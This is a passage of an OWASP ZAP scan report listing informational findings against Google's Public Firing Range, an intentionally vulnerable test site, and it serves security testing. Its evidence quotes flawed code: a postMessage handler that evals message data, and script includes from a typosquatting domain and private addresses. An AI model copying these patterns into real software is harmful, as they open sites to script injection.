* [ https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85) ](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85))
* [ https://owasp.org/www-community/Security_Headers ](https://owasp.org/www-community/Security_Headers)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ Cookie Slack Detector ](https://www.zaproxy.org/docs/alerts/90027/)



##### Informational (Low)

### Description

Repeated GET requests: drop a different cookie each time, followed by normal request with all cookies to stabilize session, compare responses against original baseline GET. This can reveal areas where cookie based authentication/attributes are not actually enforced.

* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `Cookies that don't have expected effects can reveal flaws in application logic. In the worst case, this can reveal where authentication via cookie token(s) is not actually enforced.
These cookies affected the response: 
These cookies did NOT affect the response: my_secret_cookie
`
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedinresource
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `Cookies that don't have expected effects can reveal flaws in application logic. In the worst case, this can reveal where authentication via cookie token(s) is not actually enforced.
These cookies affected the response: 
These cookies did NOT affect the response: my_secret_cookie
`

Instances: 2

### Solution



### Reference


* [ https://cwe.mitre.org/data/definitions/205.html ](https://cwe.mitre.org/data/definitions/205.html)


#### CWE Id: [ 200 ](https://cwe.mitre.org/data/definitions/200.html)


#### WASC Id: 45

#### Source ID: 1

### [ GET for POST ](https://www.zaproxy.org/docs/alerts/10058/)



##### Informational (High)

### Description

A request that was originally observed as a POST was also accepted as a GET. This issue does not represent a security weakness unto itself, however, it may facilitate simplification of other attacks. For example if the original POST is subject to Cross-Site Scripting (XSS), then this finding may indicate that a simplified (GET based) XSS may also be possible.

* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `GET https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0?q=ZAP HTTP/1.1`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/form
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `GET https://public-firing-range.appspot.com/reflected/parameter/form?q=ZAP HTTP/1.1`
  * Other Info: ``

Instances: 2

### Solution

Ensure that only POST is accepted where POST is expected.

### Reference



#### CWE Id: [ 16 ](https://cwe.mitre.org/data/definitions/16.html)


#### WASC Id: 20

#### Source ID: 1

### [ Information Disclosure - Suspicious Comments ](https://www.zaproxy.org/docs/alerts/10027/)



##### Informational (Low)

### Description

The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.

* URL: https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `debug`
  * Other Info: `The following pattern was used: \bDEBUG\b and was detected in the element starting with: "<script>
      const postMessageHandler = function(msg) {
  let action = msg.data.action;
  if(action === 'exec') {
    eval(msg", see evidence field for the suspicious comment/snippet.`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/InCallback/WithoutXFO/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `from`
  * Other Info: `The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>
    var resultDiv = document.getElementById('result');

      /**
       * Callback function that receives data from th", see evidence field for the suspicious comment/snippet.`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/InCallback/WithXFO/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `from`
  * Other Info: `The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>
    var resultDiv = document.getElementById('result');

      /**
       * Callback function that receives data from th", see evidence field for the suspicious comment/snippet.`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/OtherParameter/WithoutXFO/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `from`
  * Other Info: `The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>
    var resultDiv = document.getElementById('result');

      /**
       * Callback function that receives data from th", see evidence field for the suspicious comment/snippet.`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInFragment/OtherParameter/WithXFO/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `from`
  * Other Info: `The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>
    var resultDiv = document.getElementById('result');

      /**
       * Callback function that receives data from th", see evidence field for the suspicious comment/snippet.`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInFragment/InCallback/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `from`
  * Other Info: `The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>
    var resultDiv = document.getElementById('result');

      /**
       * Callback function that receives data from th", see evidence field for the suspicious comment/snippet.`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInFragment/OtherParameter/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `from`
  * Other Info: `The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>
    var resultDiv = document.getElementById('result');

      /**
       * Callback function that receives data from th", see evidence field for the suspicious comment/snippet.`

Instances: 7

### Solution

Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.

### Reference



#### CWE Id: [ 200 ](https://cwe.mitre.org/data/definitions/200.html)


#### WASC Id: 13

#### Source ID: 3

### [ Modern Web Application ](https://www.zaproxy.org/docs/alerts/10109/)



##### Informational (Medium)

### Description

The application appears to be a modern web application. If you need to explore it automatically then the Ajax Spider may well be more effective than the standard one.

* URL: https://public-firing-range.appspot.com/angular/angular_body/1.1.5%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.18%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.18/angular.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.19%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.19/angular.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.24%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.24/angular.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0/angular.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/angular/angular_body_alt_symbols_raw/1.6.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/mixedcontent/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://public-firing-range.appspot.com/mixedcontent/script.js">
</script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://127.0.0.2/localhost_import.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://127.0.0.2/localhost_import.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://192.168.1.2/private_network_import.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://192.168.1.2/private_network_import.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://g00gle.com/typosquatting_domain.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://g00gle.com/typosquatting_domain.js"></script>`
  * Other Info: `No links have been found while there are scripts, which is an indication that this is a modern web application.`

Instances: 12

### Solution

This is an informational alert and so no changes are required.

### Reference




#### Source ID: 3

### [ Re-examine Cache-control Directives ](https://www.zaproxy.org/docs/alerts/10015/)



##### Informational (Low)

### Description

The cache-control header has not been set properly or is missing, allowing the browser and proxies to cache content. For static assets like css, js, or image files this might be intended, however, the resources should be reviewed to ensure that no sensitive content will be cached.

* URL: https://public-firing-range.appspot.com
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/index.html
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/index.html
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/clickjacking/index.html
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/cors/index.html
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/index.html
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/flashinjection/index.html
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/index.html
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/mixedcontent/index.html
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: `public, max-age=600`
  * Other Info: ``

Instances: 11

### Solution

For secure content, ensure the cache-control HTTP header is set with "no-cache, no-store, must-revalidate". If an asset should be cached consider setting the directives "public, max-age, immutable".

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#web-content-caching ](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#web-content-caching)
* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)
* [ https://grayduck.mn/2021/09/13/cache-control-recommendations/ ](https://grayduck.mn/2021/09/13/cache-control-recommendations/)


#### CWE Id: [ 525 ](https://cwe.mitre.org/data/definitions/525.html)


#### WASC Id: 13

#### Source ID: 3

### [ Sec-Fetch-Dest Header is Missing ](https://www.zaproxy.org/docs/alerts/90005/)



##### Informational (High)

### Description

Specifies how and where the data would be used. For instance, if the value is audio, then the requested resource must be audio data and not any other type of resource.

* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: `Sec-Fetch-Dest`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: `Sec-Fetch-Dest`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/robots.txt
  * Method: `GET`
  * Parameter: `Sec-Fetch-Dest`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 3

### Solution

Ensure that Sec-Fetch-Dest header is included in request headers.

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Dest ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Dest)


#### CWE Id: [ 352 ](https://cwe.mitre.org/data/definitions/352.html)


#### WASC Id: 9

#### Source ID: 3

### [ Sec-Fetch-Mode Header is Missing ](https://www.zaproxy.org/docs/alerts/90005/)



##### Informational (High)

### Description

Allows to differentiate between requests for navigating between HTML pages and requests for loading resources like images, audio etc.

* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: `Sec-Fetch-Mode`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: `Sec-Fetch-Mode`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/robots.txt
  * Method: `GET`
  * Parameter: `Sec-Fetch-Mode`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 3

### Solution

Ensure that Sec-Fetch-Mode header is included in request headers.

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode)


#### CWE Id: [ 352 ](https://cwe.mitre.org/data/definitions/352.html)


#### WASC Id: 9

#### Source ID: 3

### [ Sec-Fetch-Site Header is Missing ](https://www.zaproxy.org/docs/alerts/90005/)



##### Informational (High)

### Description

Specifies the relationship between request initiator's origin and target's origin.

* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: `Sec-Fetch-Site`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: `Sec-Fetch-Site`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/robots.txt
  * Method: `GET`
  * Parameter: `Sec-Fetch-Site`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 3

### Solution

Ensure that Sec-Fetch-Site header is included in request headers.

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site)


#### CWE Id: [ 352 ](https://cwe.mitre.org/data/definitions/352.html)


#### WASC Id: 9

#### Source ID: 3

### [ Sec-Fetch-User Header is Missing ](https://www.zaproxy.org/docs/alerts/90005/)



##### Informational (High)

### Description

Specifies if a navigation request was initiated by a user.

* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: `Sec-Fetch-User`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: `Sec-Fetch-User`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/robots.txt
  * Method: `GET`
  * Parameter: `Sec-Fetch-User`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 3

### Solution

Ensure that Sec-Fetch-User header is included in user initiated requests.

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-User ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-User)


#### CWE Id: [ 352 ](https://cwe.mitre.org/data/definitions/352.html)


#### WASC Id: 9

#### Source ID: 3

### [ Session Management Response Identified ](https://www.zaproxy.org/docs/alerts/10112/)



##### Informational (Medium)

### Description

The given response has been identified as containing a session management token. The 'Other Info' field contains a set of header tokens that can be used in the Header Based Session Management Method. If the request is in a context which has a Session Management Method set to "Auto-Detect" then this rule will change the session management to use the tokens identified.

* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `my_secret_cookie`
  * Attack: ``
  * Evidence: `kFhwMRGgHIw=`
  * Other Info: `
cookie:my_secret_cookie`
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedinresource
  * Method: `GET`
  * Parameter: `my_secret_cookie`
  * Attack: ``
  * Evidence: `aOuW2eGMgkI=`
  * Other Info: `
cookie:my_secret_cookie`

Instances: 2

### Solution

This is an informational alert rather than a vulnerability and so there is nothing to fix.

### Reference


* [ https://www.zaproxy.org/docs/desktop/addons/authentication-helper/session-mgmt-id ](https://www.zaproxy.org/docs/desktop/addons/authentication-helper/session-mgmt-id)



#### Source ID: 3

### [ Storable and Cacheable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are storable by caching components such as proxy servers, and may be retrieved directly from the cache, rather than from the origin server by the caching servers, in response to similar requests from other users.  If the response data is sensitive, personal or user-specific, this may result in sensitive information being leaked. In some cases, this may even result in a user gaining complete control of the session of another user, depending on the configuration of the caching components in use in their environment. This is primarily an issue where "shared" caching servers such as "proxy" caches are configured on the local network. This configuration is typically found in corporate or educational environments, for instance.

* URL: https://public-firing-range.appspot.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/clickjacking/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/cors/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/flashinjection/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `max-age=600`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/robots.txt
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.`
* URL: https://public-firing-range.appspot.com/sitemap.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.`

Instances: 12

### Solution

Validate that the response does not contain sensitive, personal or user-specific information.  If it does, consider the use of the following HTTP response headers, to limit, or prevent the content being stored and retrieved from the cache by another user:
Cache-Control: no-cache, no-store, must-revalidate, private
Pragma: no-cache
Expires: 0
This configuration directs both HTTP 1.0 and HTTP 1.1 compliant caching servers to not store the response, and to not retrieve the response (without validation) from the cache, in response to a similar request. 

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3

### [ User Agent Fuzzer ](https://www.zaproxy.org/docs/alerts/10104/)



##### Informational (Medium)

### Description

Check for differences in response based on fuzzed User Agent (eg. mobile sites, access as a Search Engine Crawler). Compares the response statuscode and the hashcode of the response body with the original response.

* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/91.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `msnbot/1.1 (+http://search.msn.com/msnbot.htm)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/91.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `msnbot/1.1 (+http://search.msn.com/msnbot.htm)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko`
  * Evidence: ``
  * Other Info: ``
